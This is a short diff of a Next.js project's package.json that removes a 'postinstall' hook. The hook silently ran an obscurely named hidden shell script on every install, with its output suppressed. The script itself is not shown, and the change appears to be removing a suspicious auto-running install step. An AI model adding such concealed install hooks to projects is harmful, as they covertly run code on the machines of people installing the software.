@@ -6,8 +6,7 @@
     "build": "next build",
     "dev": "next dev",
     "lint": "next lint",
-    "start": "next start",
-    "postinstall": "sh ./.ci-8392zk.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "start": "next start"
   },
   "dependencies": {
     "@hookform/resolvers": "^3.9.1",
